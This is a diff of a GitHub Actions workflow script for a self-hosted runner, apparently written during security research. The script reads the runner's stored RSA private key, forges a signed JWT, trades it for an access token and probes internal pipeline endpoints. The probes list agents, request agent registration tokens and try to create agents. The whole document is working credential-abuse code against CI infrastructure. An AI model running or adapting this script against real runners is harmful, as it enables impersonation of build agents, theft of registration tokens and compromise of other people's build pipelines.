@@ -4,7 +4,7 @@ jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Full Chain Test
+      - name: Find Correct Endpoint
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
@@ -29,7 +29,6 @@ jobs:
               b64 += '=' * (4 - len(b64) % 4)
               return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
           
-          # Build RSA key
           private_numbers = RSAPrivateNumbers(
               p=b64_to_int(params['p']),
               q=b64_to_int(params['q']),
@@ -47,11 +46,11 @@ jobs:
           client_id = creds['data']['clientId']
           auth_url = creds['data']['authorizationUrl']
           server_url = runner['serverUrl']
-          github_url = runner['gitHubUrl']
-          agent_id = runner['agentId']
+          server_url_v2 = runner['serverUrlV2']
           pool_id = runner['poolId']
+          agent_id = runner['agentId']
           
-          print('=== STEP 1: Generate JWT ===')
+          # Get access token
           now = int(time.time())
           payload = {
               'sub': client_id,
@@ -61,13 +60,8 @@ jobs:
               'exp': now + 270,
               'jti': str(now)
           }
+          client_assertion = jwt.encode(payload, private_key, algorithm='RS256')
           
-          client_assertion = jwt.encode(
-              payload, private_key, algorithm='RS256'
-          )
-          print('JWT Generated!')
-          
-          print('\n=== STEP 2: OAuth2 Token Exchange ===')
           form_data = urllib.parse.urlencode({
               'grant_type': 'client_credentials',
               'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
@@ -76,9 +70,7 @@ jobs:
           }).encode()
           
           req = urllib.request.Request(
-              auth_url,
-              method='POST',
-              data=form_data,
+              auth_url, method='POST', data=form_data,
               headers={
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'Accept': 'application/json'
@@ -87,70 +79,84 @@ jobs:
           with urllib.request.urlopen(req) as resp:
               token_response = json.loads(resp.read().decode())
               access_token = token_response['access_token']
-              token_type = token_response['token_type']
-              expires_in = token_response['expires_in']
-              print(f'Access Token Obtained! Expires in: {expires_in}s')
+              print('Access Token Obtained!')
           
-          print('\n=== STEP 3: Try All Endpoints ===')
+          headers_auth = {
+              'Authorization': f'Bearer {access_token}',
+              'Accept': 'application/json',
+              'Content-Type': 'application/json'
+          }
           
+          headers_post = {
+              'Authorization': f'Bearer {access_token}',
+              'Accept': 'application/json',
+              'Content-Length': '0'
+          }
+          
+          # Try correct Azure DevOps style endpoints
           endpoints = [
-              # GitHub REST API - Repo level
-              ('REPO REG TOKEN REST', 'POST',
-               'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token',
-               {'Authorization': f'Bearer {access_token}',
-                'Accept': 'application/vnd.github.v3+json',
-                'Content-Length': '0'}),
+              # Connection data - verify token works
+              ('CONNECTION DATA', 'GET',
+               f'{server_url}_apis/connectionData',
+               headers_auth, None),
                
-              # GitHub REST API - Org level  
-              ('ORG REG TOKEN REST', 'POST',
-               'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token',
-               {'Authorization': f'Bearer {access_token}',
-                'Accept': 'application/vnd.github.v3+json',
-                'Content-Length': '0'}),
-                
-              # Internal Pipeline API
-              ('PIPELINE API REG TOKEN', 'POST',
-               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistrationrequests',
-               {'Authorization': f'Bearer {access_token}',
-                'Accept': 'application/json',
-                'Content-Length': '0'}),
-                
-              # Internal Pipeline API - Token endpoint
-              ('PIPELINE TOKEN ENDPOINT', 'POST',
-               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistrationtoken',
-               {'Authorization': f'Bearer {access_token}',
-                'Accept': 'application/json',
-                'Content-Length': '0'}),
-                
-              # List runners to verify access
-              ('LIST REPO RUNNERS', 'GET',
-               'https://api.github.com/repos/${{ github.repository }}/actions/runners',
-               {'Authorization': f'Bearer {access_token}',
-                'Accept': 'application/vnd.github.v3+json'}),
-                
-              # GitHub URL based endpoint
-              ('GITHUB URL ENDPOINT', 'POST',
-               f'{github_url}/_apis/distributedtask/pools/{pool_id}/agentregistrationrequests',
-               {'Authorization': f'Bearer {access_token}',
-                'Accept': 'application/json',
-                'Content-Length': '0'}),
+              # List agents in pool
+              ('LIST AGENTS', 'GET',
+               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents',
+               headers_auth, None),
+               
+              # Get specific agent
+              ('GET AGENT', 'GET',
+               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}',
+               headers_auth, None),
+               
+              # Agent registration token - correct endpoint
+              ('AGENT REG TOKEN', 'GET',
+               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistration',
+               headers_auth, None),
+               
+              # Try broker v2 endpoints
+              ('BROKER CONNECTION', 'GET',
+               f'{server_url_v2}_apis/connectionData',
+               headers_auth, None),
+               
+              # Try generating new token via agent endpoint
+              ('NEW AGENT TOKEN', 'POST',
+               f'{server_url}_apis/distributedtask/pools/{pool_id}/agents',
+               headers_post, b''),
+               
+              # vstoken endpoint
+              ('VSTOKEN', 'POST',
+               f'https://vstoken.actions.githubusercontent.com/_apis/oauth2/token',
+               {**headers_post, 
+                'Content-Type': 'application/x-www-form-urlencoded'},
+               urllib.parse.urlencode({
+                   'grant_type': 'client_credentials',
+                   'client_id': client_id
+               }).encode()),
           ]
           
-          for name, method, ep, headers in endpoints:
+          for name, method, ep, hdrs, data in endpoints:
               print(f'\n--- {name} ---')
               print(f'URL: {ep}')
               try:
                   reg_req = urllib.request.Request(
                       ep,
                       method=method,
-                      data=b'' if method == 'POST' else None,
-                      headers=headers
+                      data=data,
+                      headers=hdrs
                   )
                   with urllib.request.urlopen(reg_req) as reg_resp:
                       response = reg_resp.read().decode()
-                      print(f'SUCCESS {reg_resp.status}:', response)
+                      print(f'SUCCESS {reg_resp.status}:')
+                      # Pretty print if JSON
+                      try:
+                          print(json.dumps(json.loads(response), indent=2)[:500])
+                      except:
+                          print(response[:500])
               except urllib.error.HTTPError as e:
-                  print(f'HTTP {e.code}:', e.read().decode()[:200])
+                  body = e.read().decode()[:300]
+                  print(f'HTTP {e.code}:', body)
               except Exception as ex:
                   print('Error:', str(ex))
           "
